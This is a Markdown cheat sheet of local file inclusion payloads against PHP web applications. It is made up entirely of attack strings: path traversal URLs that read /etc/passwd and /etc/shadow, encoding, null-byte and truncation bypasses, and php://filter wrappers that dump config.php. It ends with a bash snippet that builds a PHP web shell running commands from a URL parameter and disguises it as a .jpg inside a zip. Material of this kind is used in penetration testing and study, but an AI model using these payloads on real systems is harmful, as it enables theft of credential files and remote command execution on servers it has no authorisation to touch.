# LFI Exploits
## Basic Payload
```HTTP
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=../../../../../../../../../../../../etc/shadow
```

## URL Encoding
```HTTP
http://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## Double Encoding
```HTTP
http://example.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

## UTF-8 Encoding
```HTTP
http://example.com/index.php?page=%c0%ae%c0%ae%c0%ae%c0%ae%c0%ae%c0%ae/etc/passwd
```

## Using Null Byte (%00)
```HTTP
http://example.com/index.php?page=../../../etc/passwd%00
```

## From an Existent Folder
```HTTP
http://example.com/index.php?page=scripts/../../../../../etc/passwd
```

## Path Truncation
```HTTP
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/./././././././././././././././././././
http://example.com/index.php?page=a/././././././././././././././././././././etc/passwd
```

## Using PHP Wrappers:
### Filter
```HTTP
http://example.com/index.php?page=php://filter/read=string.rot13/resource=config.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
### Zlib
```HTTP
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow
```
### Zip
```bash
echo "<pre><?php system (S_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php;
```

